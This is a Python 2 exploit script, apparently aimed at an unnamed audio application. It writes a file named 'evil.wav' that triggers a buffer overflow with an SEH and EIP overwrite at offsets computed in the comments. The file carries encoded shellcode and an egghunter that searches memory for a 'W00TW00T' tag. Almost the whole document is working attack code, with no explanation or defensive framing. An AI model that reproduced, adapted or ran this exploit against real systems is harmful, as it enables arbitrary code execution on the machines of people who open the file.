#!/usr/bin/python
file="evil.wav"
#4263

buf =  ""
buf += "\xdb\xc6\xd9\x74\x24\xf4\x5d\xb8\xc8\x38\xc8\xca\x29"
buf += "\xc9\xb1\x31\x31\x45\x18\x83\xed\xfc\x03\x45\xdc\xda"
buf += "\x3d\x36\x34\x98\xbe\xc7\xc4\xfd\x37\x22\xf5\x3d\x23"
buf += "\x26\xa5\x8d\x27\x6a\x49\x65\x65\x9f\xda\x0b\xa2\x90"
buf += "\x6b\xa1\x94\x9f\x6c\x9a\xe5\xbe\xee\xe1\x39\x61\xcf"
buf += "\x29\x4c\x60\x08\x57\xbd\x30\xc1\x13\x10\xa5\x66\x69"
buf += "\xa9\x4e\x34\x7f\xa9\xb3\x8c\x7e\x98\x65\x87\xd8\x3a"
buf += "\x87\x44\x51\x73\x9f\x89\x5c\xcd\x14\x79\x2a\xcc\xfc"
buf += "\xb0\xd3\x63\xc1\x7d\x26\x7d\x05\xb9\xd9\x08\x7f\xba"
buf += "\x64\x0b\x44\xc1\xb2\x9e\x5f\x61\x30\x38\x84\x90\x95"
buf += "\xdf\x4f\x9e\x52\xab\x08\x82\x65\x78\x23\xbe\xee\x7f"
buf += "\xe4\x37\xb4\x5b\x20\x1c\x6e\xc5\x71\xf8\xc1\xfa\x62"
buf += "\xa3\xbe\x5e\xe8\x49\xaa\xd2\xb3\x07\x2d\x60\xce\x65"
buf += "\x2d\x7a\xd1\xd9\x46\x4b\x5a\xb6\x11\x54\x89\xf3\xee"
buf += "\x1e\x90\x55\x67\xc7\x40\xe4\xea\xf8\xbe\x2a\x13\x7b"
buf += "\x4b\xd2\xe0\x63\x3e\xd7\xad\x23\xd2\xa5\xbe\xc1\xd4"
buf += "\x1a\xbe\xc3\xb6\xfd\x2c\x8f\x16\x98\xd4\x2a\x67"


egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"



exploit="W00TW00T" + buf
crash = exploit+"A"*(4112-len(exploit)) + "\xe9\x3B\x46\x00" + egghunter + "D" * (4263-4-4122-len(egghunter))

#00463BE9   . FFE4           JMP ESP



#31684630 EIP OVERWRITE
#68463368 SEH HANDLER
#root@kali:~# /usr/bin/msf-pattern_offset -q 68463368
#[*] Exact match at offset 4120
#root@kali:~# /usr/bin/msf-pattern_offset -q 31684630
#[*] Exact match at offset 4112

print len(crash)

writeFile = open (file, "w")
writeFile.write(crash)
writeFile.close()
            
